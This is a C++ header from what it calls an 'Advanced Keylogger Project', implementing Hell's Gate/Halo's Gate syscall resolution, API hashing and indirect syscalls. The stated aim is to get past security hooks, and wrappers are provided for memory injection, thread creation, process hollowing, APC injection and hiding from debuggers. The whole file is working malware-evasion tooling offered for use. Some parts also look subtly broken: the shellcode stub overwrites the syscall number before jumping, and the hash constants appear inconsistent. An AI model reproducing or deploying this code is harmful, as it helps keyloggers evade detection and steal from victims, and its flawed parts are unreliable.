/*
 * Dynamic Syscalls Header
 * Hell's Gate / Halo's Gate + Indirect Syscalls Implementation
 * 
 * Features:
 * - Runtime SSN (System Service Number) resolution from ntdll.dll
 * - Halo's Gate: Handles hooked functions by checking neighbors
 * - Indirect syscalls: Jumps to ntdll syscall;ret gadget
 * - Windows 10/11 all builds compatible
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>
#include <winternl.h>

#pragma warning(disable: 4244)

// ==================== STRUCTURES ====================

// Syscall entry - holds resolved SSN and syscall address
typedef struct _SYSCALL_ENTRY {
    DWORD dwHash;           // Hash of function name
    DWORD dwSSN;            // System Service Number
    PVOID pSyscallAddr;     // Address of syscall instruction in ntdll
    PVOID pFunctionAddr;    // Original function address
    BOOL bResolved;         // Whether this entry is resolved
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Syscall table for caching
#define MAX_SYSCALLS 256
static SYSCALL_ENTRY g_SyscallTable[MAX_SYSCALLS] = { 0 };
static DWORD g_SyscallCount = 0;
static BOOL g_SyscallsInitialized = FALSE;

// ==================== HASH ALGORITHM ====================
// djb2 hash - fast and good distribution

constexpr DWORD HashStringDjb2(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Runtime version
inline DWORD HashString(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

// Compile-time hash macro
#define HASH(s) (HashStringDjb2(s))

// ==================== PREDEFINED HASHES ====================
// Common NT functions we use

#define HASH_NtAllocateVirtualMemory    0x6793C34C
#define HASH_NtProtectVirtualMemory     0x082962D3
#define HASH_NtWriteVirtualMemory       0xC8E64F07
#define HASH_NtCreateThreadEx           0x2786A87C
#define HASH_NtOpenProcess              0x4B5E6C67
#define HASH_NtClose                    0x40D057A9
#define HASH_NtQuerySystemInformation   0x55A89BC3
#define HASH_NtDelayExecution           0xF5A936AA
#define HASH_NtCreateFile               0x2FEEE54A
#define HASH_NtReadFile                 0xBA6A7BDA
#define HASH_NtWriteFile                0xBC5AA94D
#define HASH_NtQueryInformationProcess  0x8CEAD755
#define HASH_NtSetInformationThread     0x22EAD854
#define HASH_NtUnmapViewOfSection       0x6558C4B3
#define HASH_NtMapViewOfSection         0xE38D1AB4
#define HASH_NtCreateSection            0xF7A92C17
#define HASH_NtQueueApcThread           0x107A8C58
#define HASH_NtResumeThread             0x5A4BC653
#define HASH_NtSuspendThread            0x68C8A4D7
#define HASH_NtWaitForSingleObject      0xA7D8C1B2
#define HASH_NtGetContextThread         0x3C5E7A1B
#define HASH_NtSetContextThread         0x4D6F8B2C
#define HASH_NtContinue                 0x7E8F9C3D

// ==================== PEB/LDR WALKING ====================

// Get PEB without calling any API
inline PPEB GetPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

// Get module base by hash
inline PVOID GetModuleByHash(DWORD dwHash) {
    PPEB pPeb = GetPEB();
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;
    
    while (pListEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pListEntry, 
            LDR_DATA_TABLE_ENTRY, 
            InMemoryOrderLinks
        );
        
        if (pEntry->FullDllName.Buffer) {
            // Convert wide string to ASCII for hashing
            char szModuleName[256] = { 0 };
            int i = 0;
            WCHAR* pName = pEntry->FullDllName.Buffer;
            
            // Get just the filename, not full path
            WCHAR* pLastSlash = pName;
            while (*pName) {
                if (*pName == L'\\' || *pName == L'/') {
                    pLastSlash = pName + 1;
                }
                pName++;
            }
            
            pName = pLastSlash;
            while (*pName && i < 255) {
                // Convert to lowercase
                szModuleName[i++] = (*pName >= L'A' && *pName <= L'Z') 
                    ? (char)(*pName + 32) 
                    : (char)*pName;
                pName++;
            }
            
            if (HashString(szModuleName) == dwHash) {
                return pEntry->DllBase;
            }
        }
        
        pListEntry = pListEntry->Flink;
    }
    
    return NULL;
}

// Hash for ntdll.dll
#define HASH_NTDLL 0x6A4ABC5B  // "ntdll.dll"

// Get ntdll base
inline PVOID GetNtdllBase() {
    static PVOID pNtdll = NULL;
    if (!pNtdll) {
        pNtdll = GetModuleByHash(HASH_NTDLL);
    }
    return pNtdll;
}

// ==================== EXPORT TABLE PARSING ====================

inline PVOID GetExportByHash(PVOID pModuleBase, DWORD dwHash) {
    if (!pModuleBase) return NULL;
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    DWORD dwExportRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportRVA) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + dwExportRVA);
    
    PDWORD pNameRVAs = (PDWORD)((BYTE*)pModuleBase + pExportDir->AddressOfNames);
    PDWORD pFuncRVAs = (PDWORD)((BYTE*)pModuleBase + pExportDir->AddressOfFunctions);
    PWORD pOrdinals = (PWORD)((BYTE*)pModuleBase + pExportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* szName = (const char*)((BYTE*)pModuleBase + pNameRVAs[i]);
        
        if (HashString(szName) == dwHash) {
            WORD wOrdinal = pOrdinals[i];
            return (PVOID)((BYTE*)pModuleBase + pFuncRVAs[wOrdinal]);
        }
    }
    
    return NULL;
}

// ==================== SSN EXTRACTION ====================
/*
 * Hell's Gate Technique:
 * NT functions start with:
 *   mov r10, rcx       ; 4C 8B D1
 *   mov eax, <SSN>     ; B8 XX XX 00 00
 *   ...
 *   syscall            ; 0F 05
 *   ret                ; C3
 *
 * If hooked, first bytes may be jmp/call. Use Halo's Gate
 * to check neighboring functions.
 */

// Check if function is hooked (first byte is JMP or CALL)
inline BOOL IsFunctionHooked(PVOID pFuncAddr) {
    BYTE* pBytes = (BYTE*)pFuncAddr;
    
    // Check for common hook patterns
    // E9 = JMP rel32
    // E8 = CALL rel32  
    // FF 25 = JMP [rip+rel32]
    // 68 XX XX XX XX C3 = PUSH addr; RET (push-ret)
    
    if (pBytes[0] == 0xE9 || pBytes[0] == 0xE8) return TRUE;
    if (pBytes[0] == 0xFF && pBytes[1] == 0x25) return TRUE;
    if (pBytes[0] == 0x68 && pBytes[5] == 0xC3) return TRUE;
    
    // Valid NT function should start with: mov r10, rcx
    // 4C 8B D1
    if (pBytes[0] != 0x4C || pBytes[1] != 0x8B || pBytes[2] != 0xD1) {
        return TRUE;  // Probably hooked
    }
    
    return FALSE;
}

// Extract SSN from function bytes (Hell's Gate)
inline DWORD ExtractSSN(PVOID pFuncAddr) {
    BYTE* pBytes = (BYTE*)pFuncAddr;
    
    // Standard pattern:
    // 4C 8B D1        mov r10, rcx
    // B8 XX XX 00 00  mov eax, SSN
    
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 &&
        pBytes[3] == 0xB8 && pBytes[6] == 0x00 && pBytes[7] == 0x00) {
        return *(DWORD*)(pBytes + 4);
    }
    
    // Windows 11 variant (test byte at offset 5)
    // 4C 8B D1        mov r10, rcx
    // B8 XX XX 00 00  mov eax, SSN
    // F6 04 25 ...    test byte ptr [...], ...
    
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 &&
        pBytes[3] == 0xB8) {
        return *(DWORD*)(pBytes + 4);
    }
    
    return (DWORD)-1;
}

// Find syscall;ret gadget address in function
inline PVOID FindSyscallAddr(PVOID pFuncAddr) {
    BYTE* pBytes = (BYTE*)pFuncAddr;
    
    // Search for syscall (0F 05) followed by ret (C3)
    // within reasonable range (32 bytes)
    for (int i = 0; i < 32; i++) {
        if (pBytes[i] == 0x0F && pBytes[i+1] == 0x05 && pBytes[i+2] == 0xC3) {
            return &pBytes[i];
        }
    }
    
    return NULL;
}

// ==================== HALO'S GATE ====================
/*
 * If function is hooked, check neighbors:
 * - Previous function has SSN-1
 * - Next function has SSN+1
 * - We can infer our SSN from neighbors
 */

inline DWORD HalosGateUp(PVOID pFuncAddr, WORD wIndex) {
    BYTE* pBytes = (BYTE*)pFuncAddr;
    
    // Each Nt function is typically 32 bytes apart
    BYTE* pNeighbor = pBytes - (32 * wIndex);
    
    if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 &&
        pNeighbor[3] == 0xB8) {
        DWORD dwSSN = *(DWORD*)(pNeighbor + 4);
        return dwSSN + wIndex;
    }
    
    return (DWORD)-1;
}

inline DWORD HalosGateDown(PVOID pFuncAddr, WORD wIndex) {
    BYTE* pBytes = (BYTE*)pFuncAddr;
    
    BYTE* pNeighbor = pBytes + (32 * wIndex);
    
    if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 &&
        pNeighbor[3] == 0xB8) {
        DWORD dwSSN = *(DWORD*)(pNeighbor + 4);
        if (dwSSN >= wIndex) {
            return dwSSN - wIndex;
        }
    }
    
    return (DWORD)-1;
}

// ==================== MAIN RESOLUTION ====================

inline BOOL ResolveSyscall(DWORD dwHash, PSYSCALL_ENTRY pEntry) {
    PVOID pNtdll = GetNtdllBase();
    if (!pNtdll) return FALSE;
    
    PVOID pFuncAddr = GetExportByHash(pNtdll, dwHash);
    if (!pFuncAddr) return FALSE;
    
    pEntry->dwHash = dwHash;
    pEntry->pFunctionAddr = pFuncAddr;
    pEntry->bResolved = FALSE;
    
    // Check if hooked
    if (!IsFunctionHooked(pFuncAddr)) {
        // Direct extraction (Hell's Gate)
        pEntry->dwSSN = ExtractSSN(pFuncAddr);
        pEntry->pSyscallAddr = FindSyscallAddr(pFuncAddr);
        
        if (pEntry->dwSSN != (DWORD)-1 && pEntry->pSyscallAddr) {
            pEntry->bResolved = TRUE;
            return TRUE;
        }
    }
    
    // Function is hooked - use Halo's Gate
    for (WORD i = 1; i < 50; i++) {
        // Try neighbors above
        DWORD dwSSN = HalosGateUp(pFuncAddr, i);
        if (dwSSN != (DWORD)-1) {
            pEntry->dwSSN = dwSSN;
            
            // Find syscall gadget in neighbor
            BYTE* pNeighbor = (BYTE*)pFuncAddr - (32 * i);
            pEntry->pSyscallAddr = FindSyscallAddr(pNeighbor);
            
            if (pEntry->pSyscallAddr) {
                pEntry->bResolved = TRUE;
                return TRUE;
            }
        }
        
        // Try neighbors below
        dwSSN = HalosGateDown(pFuncAddr, i);
        if (dwSSN != (DWORD)-1) {
            pEntry->dwSSN = dwSSN;
            
            BYTE* pNeighbor = (BYTE*)pFuncAddr + (32 * i);
            pEntry->pSyscallAddr = FindSyscallAddr(pNeighbor);
            
            if (pEntry->pSyscallAddr) {
                pEntry->bResolved = TRUE;
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

// Get or create syscall entry from cache
inline PSYSCALL_ENTRY GetSyscallEntry(DWORD dwHash) {
    // Check cache
    for (DWORD i = 0; i < g_SyscallCount; i++) {
        if (g_SyscallTable[i].dwHash == dwHash && g_SyscallTable[i].bResolved) {
            return &g_SyscallTable[i];
        }
    }
    
    // Resolve new entry
    if (g_SyscallCount < MAX_SYSCALLS) {
        if (ResolveSyscall(dwHash, &g_SyscallTable[g_SyscallCount])) {
            return &g_SyscallTable[g_SyscallCount++];
        }
    }
    
    return NULL;
}

// ==================== INDIRECT SYSCALL EXECUTION ====================
/*
 * Instead of executing syscall directly in our code,
 * we jump to the syscall;ret gadget in ntdll.
 * This makes call stack look more legitimate.
 */

#ifdef _WIN64

// x64 Indirect Syscall Stub
// Parameters: rcx, rdx, r8, r9, stack
// SSN in rax, jump to syscall gadget

extern "C" NTSTATUS IndirectSyscall(
    DWORD dwSSN,
    PVOID pSyscallAddr,
    ...
);

// Inline assembly not supported in x64 MSVC, use separate .asm file
// Or use this trick with function pointer

typedef NTSTATUS (*SYSCALL_FUNC)(...);

// Generic syscall wrapper
template<typename... Args>
inline NTSTATUS DoSyscall(DWORD dwHash, Args... args) {
    PSYSCALL_ENTRY pEntry = GetSyscallEntry(dwHash);
    if (!pEntry || !pEntry->bResolved) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // For indirect syscall, we need to set up registers and jump
    // This is a simplified version - full implementation needs ASM
    
    // Prepare the syscall
    // mov r10, rcx
    // mov eax, SSN
    // jmp [syscall_addr]
    
    // Create shellcode on stack
    BYTE shellcode[32];
    DWORD idx = 0;
    
    // mov r10, rcx
    shellcode[idx++] = 0x4C;
    shellcode[idx++] = 0x8B;
    shellcode[idx++] = 0xD1;
    
    // mov eax, SSN
    shellcode[idx++] = 0xB8;
    *(DWORD*)&shellcode[idx] = pEntry->dwSSN;
    idx += 4;
    
    // jmp [syscall_addr] - indirect through register
    // mov rax, addr
    shellcode[idx++] = 0x48;
    shellcode[idx++] = 0xB8;
    *(PVOID*)&shellcode[idx] = pEntry->pSyscallAddr;
    idx += 8;
    
    // jmp rax
    shellcode[idx++] = 0xFF;
    shellcode[idx++] = 0xE0;
    
    // Make shellcode executable
    DWORD oldProtect;
    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Cast and call
    SYSCALL_FUNC pFunc = (SYSCALL_FUNC)shellcode;
    NTSTATUS status = pFunc(args...);
    
    return status;
}

#else // x86

// x86 syscall via int 0x2e or sysenter
// Not commonly used on modern Windows, but included for completeness

inline NTSTATUS DoSyscall_x86(DWORD dwSSN, DWORD numArgs, ...) {
    // x86 syscalls are different - use WoW64 transition
    // This is handled by Heaven's Gate in heavensgate.h
    return STATUS_NOT_IMPLEMENTED;
}

#endif

// ==================== CONVENIENCE WRAPPERS ====================

// NtAllocateVirtualMemory
inline NTSTATUS Sw_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    return DoSyscall(HASH_NtAllocateVirtualMemory,
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

// NtProtectVirtualMemory
inline NTSTATUS Sw_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    return DoSyscall(HASH_NtProtectVirtualMemory,
        ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

// NtWriteVirtualMemory
inline NTSTATUS Sw_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
) {
    return DoSyscall(HASH_NtWriteVirtualMemory,
        ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
}

// NtCreateThreadEx
inline NTSTATUS Sw_NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaxStackSize,
    PVOID AttributeList
) {
    return DoSyscall(HASH_NtCreateThreadEx,
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
        MaxStackSize, AttributeList);
}

// NtOpenProcess
inline NTSTATUS Sw_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    return DoSyscall(HASH_NtOpenProcess,
        ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

// NtClose
inline NTSTATUS Sw_NtClose(HANDLE Handle) {
    return DoSyscall(HASH_NtClose, Handle);
}

// NtDelayExecution (Sleep alternative)
inline NTSTATUS Sw_NtDelayExecution(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
) {
    return DoSyscall(HASH_NtDelayExecution, Alertable, DelayInterval);
}

// NtQueryInformationProcess
inline NTSTATUS Sw_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
) {
    return DoSyscall(HASH_NtQueryInformationProcess,
        ProcessHandle, ProcessInformationClass, ProcessInformation,
        ProcessInformationLength, ReturnLength);
}

// NtSetInformationThread (for hiding from debugger)
inline NTSTATUS Sw_NtSetInformationThread(
    HANDLE ThreadHandle,
    THREADINFOCLASS ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
) {
    return DoSyscall(HASH_NtSetInformationThread,
        ThreadHandle, ThreadInformationClass, ThreadInformation,
        ThreadInformationLength);
}

// NtUnmapViewOfSection (for process hollowing)
inline NTSTATUS Sw_NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
) {
    return DoSyscall(HASH_NtUnmapViewOfSection, ProcessHandle, BaseAddress);
}

// NtQueueApcThread (for APC injection)
inline NTSTATUS Sw_NtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
) {
    return DoSyscall(HASH_NtQueueApcThread,
        ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
}

// NtResumeThread
inline NTSTATUS Sw_NtResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
) {
    return DoSyscall(HASH_NtResumeThread, ThreadHandle, PreviousSuspendCount);
}

// NtSuspendThread
inline NTSTATUS Sw_NtSuspendThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
) {
    return DoSyscall(HASH_NtSuspendThread, ThreadHandle, PreviousSuspendCount);
}

// NtWaitForSingleObject
inline NTSTATUS Sw_NtWaitForSingleObject(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
) {
    return DoSyscall(HASH_NtWaitForSingleObject, Handle, Alertable, Timeout);
}

// NtGetContextThread
inline NTSTATUS Sw_NtGetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
) {
    return DoSyscall(HASH_NtGetContextThread, ThreadHandle, ThreadContext);
}

// NtSetContextThread
inline NTSTATUS Sw_NtSetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
) {
    return DoSyscall(HASH_NtSetContextThread, ThreadHandle, ThreadContext);
}

// ==================== INITIALIZATION ====================

inline BOOL InitializeSyscalls() {
    if (g_SyscallsInitialized) return TRUE;
    
    // Pre-resolve common syscalls
    DWORD commonHashes[] = {
        HASH_NtAllocateVirtualMemory,
        HASH_NtProtectVirtualMemory,
        HASH_NtWriteVirtualMemory,
        HASH_NtCreateThreadEx,
        HASH_NtClose,
        HASH_NtDelayExecution,
        HASH_NtQueryInformationProcess,
        HASH_NtSetInformationThread,
        HASH_NtUnmapViewOfSection
    };
    
    for (int i = 0; i < sizeof(commonHashes)/sizeof(commonHashes[0]); i++) {
        GetSyscallEntry(commonHashes[i]);
    }
    
    g_SyscallsInitialized = TRUE;
    return TRUE;
}

// ==================== SLEEP ALTERNATIVE ====================
// Sw_Sleep uses NtDelayExecution via syscall

inline void Sw_Sleep(DWORD dwMilliseconds) {
    LARGE_INTEGER li;
    li.QuadPart = -((LONGLONG)dwMilliseconds * 10000);
    Sw_NtDelayExecution(FALSE, &li);
}

#endif // SYSCALLS_H
